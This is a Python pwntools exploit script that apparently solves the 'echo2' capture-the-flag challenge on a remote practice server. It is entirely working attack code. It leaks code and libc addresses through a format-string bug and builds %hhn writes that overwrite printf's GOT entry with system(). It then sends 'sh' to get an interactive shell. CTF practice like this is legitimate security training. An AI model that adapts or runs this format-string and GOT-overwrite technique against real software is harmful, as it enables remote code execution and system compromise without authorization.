from pwn import *

#p = process( './echo2' )
p = remote( 'hackme.inndy.tw', 7712 )

def fmt( prev, val, idx ):
	result = b''
	if val > prev:
		result += b'%' + bytes( str( val - prev ), 'utf-8' ) + b'c'
	elif val == prev:
		result += b''
	else:
		result += b'%' + bytes( str( val - prev + 256 ), 'utf-8' ) + b'c'
	result += b'%' + bytes( str( idx ), 'utf-8' ) + b'$hhn'
	return result

libc_start_main_off = 0x0000000000020740
main_off = 0x9b9

payload = b'%41$p..%43$p..'
p.sendline( payload )

code_base = int( p.recvuntil( '..' )[:-2].decode("utf-8"), 16 ) - main_off - 74
print( hex( code_base ) )
libc_base = int( p.recvuntil( '..' )[:-2].decode( 'utf-8' ), 16 ) - libc_start_main_off - 240
print( hex( libc_base ) )

printf_got = code_base + 0x0000000000201020
print( hex( printf_got ) )

system_off = 0x0000000000045380
system_add = libc_base + system_off

print( hex( system_add ) )

payload = b''
prev = 0
for i in range( 6 ):
	payload += fmt( prev, ( system_add >> i * 8 ) & 0xff, 22 + i )
	prev = ( system_add >> i * 8 ) & 0xff

payload = payload.ljust( 0x80, b'a' ) + p64( printf_got ) + p64( printf_got + 1 ) + p64( printf_got + 2 ) + p64( printf_got + 3 ) + p64( printf_got + 4 ) + p64( printf_got + 5 )
p.sendline( payload )

p.recvuntil( '\n' )

p.sendline( 'sh' )

p.interactive()
